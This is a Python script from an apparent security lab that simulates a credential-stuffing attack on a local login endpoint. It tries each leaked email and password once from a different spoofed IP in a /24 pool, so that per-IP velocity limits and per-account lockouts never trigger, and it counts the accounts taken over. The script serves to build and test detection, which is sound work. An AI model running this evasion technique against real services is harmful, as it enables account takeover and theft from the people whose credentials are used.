"""Round 1 attack — distributed, one-try-per-account stuffer.

Beats per-IP velocity and per-account lockout the only way that reliably works:
don't concentrate. Each credential is tried exactly once, from a different IP in a
rented /24. No single IP is busy, no account sees two failures, so neither L1
counter ever trips. The whole run still shares one /24 and one ASN, though — which
is the thread Round 2 pulls on.

Real stuffers add seconds of jitter between attempts; we default to none so the
lab runs fast. Set STUFFER_DELAY to slow it down.
"""

from __future__ import annotations

import asyncio
import ipaddress
import os
import random

import httpx

from _common import BASE_URL, edge_headers, is_success, load_combos, require_local_target

PROXY_POOL = [str(ip) for ip in ipaddress.ip_network("203.0.113.0/24").hosts()]  # 254 IPs, 1 ASN
DELAY = float(os.environ.get("STUFFER_DELAY", "0"))
CONCURRENCY = 20
ACTOR = "bot:round1"


async def run() -> dict:
    require_local_target(BASE_URL)
    combos = load_combos()
    rng = random.Random(1)
    hits: list[str] = []
    sem = asyncio.Semaphore(CONCURRENCY)

    async with httpx.AsyncClient(base_url=BASE_URL, timeout=10.0) as client:
        async def attempt(email: str, pw: str, ip: str):
            async with sem:
                if DELAY:
                    await asyncio.sleep(rng.uniform(0, DELAY))
                try:
                    r = await client.post("/login", json={"email": email, "password": pw},
                                          headers=edge_headers(ACTOR, ip))
                    if is_success(r):
                        hits.append(email)
                except httpx.RequestError:
                    pass

        tasks = [attempt(e, p, rng.choice(PROXY_POOL)) for e, p in combos]
        await asyncio.gather(*tasks)

    return {"attack": ACTOR, "attempts": len(combos), "accounts_taken_over": len(hits),
            "hits": sorted(hits)}


def main():
    result = asyncio.run(run())
    print(f"[{result['attack']}] {result['attempts']} attempts -> "
          f"{result['accounts_taken_over']} accounts taken over")


if __name__ == "__main__":
    main()
